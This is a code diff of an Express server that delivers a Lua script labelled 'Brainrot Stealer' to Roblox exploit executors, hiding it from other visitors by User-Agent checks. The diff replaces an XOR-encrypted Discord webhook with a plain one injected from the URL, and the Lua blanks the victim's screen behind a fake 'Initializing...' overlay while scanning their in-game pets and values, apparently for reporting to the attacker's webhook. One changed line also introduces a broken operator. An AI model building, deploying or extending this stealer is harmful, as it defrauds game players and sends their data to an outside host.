@@ -10,13 +10,12 @@ function blockNonExecutor(req, res, next) {
   const ua  = (req.get("User-Agent") || "").toLowerCase();
   const ref = (req.get("Referer")    || "").toLowerCase();
 
-  const allowed =
-    ua.includes("roblox") ||
-    ua.includes("synapse") ||
-    ua.includes("krnl") ||
-    ua.includes("fluxus") ||
-    ua.includes("executor") ||
-    ref.includes("roblox.com");
+  const allowed = ua.includes("roblox") ||
+                  ua.includes("synapse") ||
+                  ua.includes("krnl") ||
+                  ua.includes("fluxus") ||
+                  ua.includes("executor") ||
+                  ref.includes("roblox.com");
 
   if (!allowed) {
     return res.status(403).send(`
@@ -40,73 +39,30 @@ app.get("/", (req, res) => {
 });
 
 // ---------------------------------------------------------------
-// /raw – EXECUTORS ONLY + INJECT ENCRYPTED WEBHOOK
+// /raw – EXECUTORS ONLY + PLAIN WEBHOOK
 // ---------------------------------------------------------------
 app.get("/raw", blockNonExecutor, (req, res) => {
-  const encrypted = req.query.wh;
-  if (!encrypted) return res.status(400).send("-- MISSING DATA --");
-
-  // ---- DECRYPT (must match Lua) ----
-  let webhook = "";
-  try {
-    const key1 = "brainrot_secure_2024_key1";
-    let layer1 = "";
-    for (let i = 0; i < encrypted.length; i++) {
-      const k = key1.charCodeAt(i % key1.length);
-      const d = encrypted.charCodeAt(i);
-      layer1 += String.fromCharCode(d ^ k);
-    }
-
-    const key2 = "x7f9!pQz@3mK*vR$5";
-    let layer2 = "";
-    for (let i = 0; i < layer1.length; i++) {
-      const k = key2.charCodeAt(i % key2.length);   // <-- FIXED: was "char  CodeAt"
-      const d = layer1.charCodeAt(i);
-      layer2 += String.fromCharCode(d ^ k);
-    }
-
-    webhook = Buffer.from(layer2, "base64").toString("utf-8");
-  } catch (e) {
-    return res.status(400).send("-- INVALID ENCRYPTION --");
+  const webhook = req.query.wh;
+  if (!webhook || !webhook.startsWith("https://discord.com/api/webhooks/")) {
+    return res.status(400).send("-- INVALID OR MISSING WEBHOOK --");
   }
 
-  if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
-    return res.status(400).send("-- INVALID WEBHOOK --");
-  }
-
-  // ---- FULL FIXED LUA SCRIPT (same as the working one) ----
-  const lua = `-- BRAINROT STEALER – FULLY FIXED
+  // ---- FULL FIXED LUA SCRIPT (PLAIN WEBHOOK) ----
+  const lua = `-- BRAINROT STEALER – FULLY FIXED + PLAIN WEBHOOK
 local Players        = game:GetService("Players")
 local HttpService    = game:GetService("HttpService")
 local UserInputSvc   = game:GetService("UserInputService")
+local CoreGui        = game:GetService("CoreGui")
 
--- WAIT FOR PLAYER & GUI
+-- WAIT FOR PLAYER & PLAYERGUI
 local player = Players.LocalPlayer
 if not player then repeat task.wait() until Players.LocalPlayer player = Players.LocalPlayer end
 repeat task.wait() until player:FindFirstChild("PlayerGui")
 pcall(function() HttpService.HttpEnabled = true end)
 task.wait(0.5)
 
--- DECRYPT WEBHOOK
-local EncryptedData = "${encrypted}"
-local function DecryptWebhook(d)
-    local k1 = "brainrot_secure_2024_key1"
-    local k2 = "x7f9!pQz@3mK*vR$5"
-    local l1 = ""
-    for i = 1, #d do
-        local kc = string.byte(k1, (i-1)%#k1 + 1)
-        local dc = string.byte(d, i)
-        l1 = l1 .. string.char(bit32.bxor(dc, kc))
-    end
-    local l2 = ""
-    for i = 1, #l1 do
-        local kc = string.byte(k2, (i-1)%#k2 + 1)
-        local dc = string.byte(l1, i)
-        l2 = l2 .. string.char(bit32.bxor(dc, kc))
-    end
-    return l2
-end
-local WebhookURL = DecryptWebhook(EncryptedData)
+-- PLAIN WEBHOOK URL
+local WebhookURL = "${webhook}"
 
 -- SAFE HTTP
 local function SafeHttp(url, body)
@@ -139,39 +95,84 @@ local function Dev() return UserInputSvc.TouchEnabled and "Mobile" or "PC" end
 local function FM(v) if v>=1e9 then return string.format("$%.2fB/s",v/1e9) elseif v>=1e6 then return string.format("$%.2fM/s",v/1e6) elseif v>=1e3 then return string.format("$%.2fK/s",v/1e3) else return "$"..v.."/s" end end
 local function FPL(p,m) if #p==0 then return "None" end local s="" for i=1,math.min(5,#p) do s=s..i..". "..p[i].Name.." | "..(m and FM(p[i].Money) or p[i].Rate).."\\n" end return s end
 
--- BLACK SCREEN
+-- BLACK SCREEN (DESTROY ALL GUIS SAFELY)
 local function BS()
-    pcall(function() for _,g in pairs(player.PlayerGui:GetChildren()) do pcall(function()g:Destroy()end) end end)
-    local sg=Instance.new("ScreenGui") sg.Name="BrainrotScanner" sg.ResetOnSpawn=false sg.Parent=player.PlayerGui
-    local bg=Instance.new("Frame") bg.Size=UDim2.new(2,0,2,0) bg.Position=UDim2.new(-0.5,0,-0.5,0) bg.BackgroundColor3=Color3.new(0,0,0) bg.BorderSizePixel=0 bg.Parent=sg
-    local t=Instance.new("TextLabel") t.Size=UDim2.new(1,0,0,80) t.Position=UDim2.new(0,0,0.4,0) t.BackgroundTransparency=1 t.Text="06:00" t.TextColor3=Color3.fromRGB(0,255,255) t.TextSize=48 t.Font=Enum.Font.GothamBold t.Parent=bg
-    local s=Instance.new("TextLabel") s.Size=UDim2.new(1,0,0,25) s.Position=UDim2.new(0,0,0.55,0) s.BackgroundTransparency=1 s.Text="Initializing..." s.TextColor3=Color3.new(1,1,1) s.TextSize=18 s.Font=Enum.Font.Gotham s.Parent=bg
-    return sg,t,s
+    pcall(function()
+        for _, g in pairs(player.PlayerGui:GetChildren()) do
+            if g:IsA("ScreenGui") or g:IsA("GuiObject") then
+                pcall(function() g:Destroy() end)
+            end
+        end
+        -- Prevent CoreGui errors
+        for _, g in pairs(CoreGui:GetChildren()) do
+            if g.Name ~= "RobloxGui" then
+                pcall(function() g:Destroy() end)
+            end
+        end
+    end)
+
+    local sg = Instance.new("ScreenGui")
+    sg.Name = "BrainrotScanner"
+    sg.ResetOnSpawn = false
+    sg.Parent = player.PlayerGui
+
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(2,0,2,0)
+    bg.Position = UDim2.new(-0.5,0,-0.5,0)
+    bg.BackgroundColor3 = Color3.new(0,0,0)
+    bg.BorderSizePixel = 0
+    bg.Parent = sg
+
+    local t = Instance.new("TextLabel")
+    t.Size = UDim2.new(1,0,0,80)
+    t.Position = UDim2.new(0,0,0.4,0)
+    t.BackgroundTransparency = 1
+    t.Text = "06:00"
+    t.TextColor3 = Color3.fromRGB(0,255,255)
+    t.TextSize = 48
+    t.Font = Enum.Font.GothamBold
+    t.Parent = bg
+
+    local s = Instance.new("TextLabel")
+    s.Size = UDim2.new(1,0,0,25)
+    s.Position = UDim2.new(0,0,0.55,0)
+    s.BackgroundTransparency = 1
+    s.Text = "Initializing..."
+    s.TextColor3 = Color3.new(1,1,1)
+    s.TextSize = 18
+    s.Font = Enum.Font.Gotham
+    s.Parent = bg
+
+    return sg, t, s
 end
 
 -- SCAN PETS
 local function Scan()
     local all,br,top={},{},{}
     pcall(function()
-        local plots=workspace:FindFirstChild("Plots") if not plots then return end
+        local plots = workspace:FindFirstChild("Plots")
+        if not plots then return end
         for _,plot in pairs(plots:GetChildren()) do
-            local pods=plot:FindFirstChild("AnimalPodiums") if not pods then continue end
+            local pods = plot:FindFirstChild("AnimalPodiums")
+            if not pods then continue end
             for _,pod in pairs(pods:GetChildren()) do
-                local base=pod:FindFirstChild("Base") if not base then continue end
-                local spawn=base:FindFirstChild("Spawn") if not spawn then continue end
-                local att=spawn:FindFirstChild("Attachment") if not att then continue end
-                local oh=att:FindFirstChild("AnimalOverhead") if not oh then continue end
-                local nameL=oh:FindFirstChild("DisplayName")
-                local genL=oh:FindFirstChild("Generation")
+                local base = pod:FindFirstChild("Base") if not base then continue end
+                local spawn = base:FindFirstChild("Spawn") if not spawn then continue end
+                local att = spawn:FindFirstChild("Attachment") if not att then continue end
+                local oh = att:FindFirstChild("AnimalOverhead") if not oh then continue end
+                local nameL = oh:FindFirstChild("DisplayName")
+                local genL = oh:FindFirstChild("Generation")
                 if not nameL or not nameL:IsA("TextLabel") then continue end
-                local n=nameL.Text local r=genL and genL.Text or "0/s" if n=="" then continue end
-                local num=tonumber(string.match(r,"([%d%.]+)")) or 0
-                local mon=0
-                if string.find(r,"B/s") then mon=num*1e9
-                elseif string.find(r,"M/s") then mon=num*1e6
-                elseif string.find(r,"K/s") then mon=num*1e3
-                else mon=num end
-                local pet={Name=n,Rate=r,Money=mon}
+                local n = nameL.Text
+                local r = genL and genL.Text or "0/s"
+                if n == "" then continue end
+                local num = tonumber(string.match(r,"([%d%.]+)")) or 0
+                local mon = 0
+                if string.find(r,"B/s") then mon = num*1e9
+                elseif string.find(r,"M/s") then mon = num*1e6
+                elseif string.find(r,"K/s") then mon = num**1e3
+                else mon = num end
+                local pet = {Name=n,Rate=r,Money=mon}
                 table.insert(all,pet)
                 if string.find(string.lower(n),"brainrot") and mon>1e6 then table.insert(br,pet) end
             end
@@ -246,8 +247,8 @@ end
 GUI()
 print("Brainrot Stealer loaded!")`;
 
-  // inject encrypted webhook
-  const finalLua = lua.replace("${encrypted}", encrypted);
+  // inject plain webhook
+  const finalLua = lua.replace("${webhook}", webhook);
   res.type("text/plain").send(finalLua);
 });
 
@@ -267,5 +268,5 @@ app.use((req, res) => {
 // ---------------------------------------------------------------
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
-  console.log(`Example: https://YOURDOMAIN.onrender.com/raw?wh=<ENCRYPTED_WEBHOOK>`);
+  console.log(`Example: https://your-site.onrender.com/raw?wh=https://discord.com/api/webhooks/12345/ABC...`);
 });
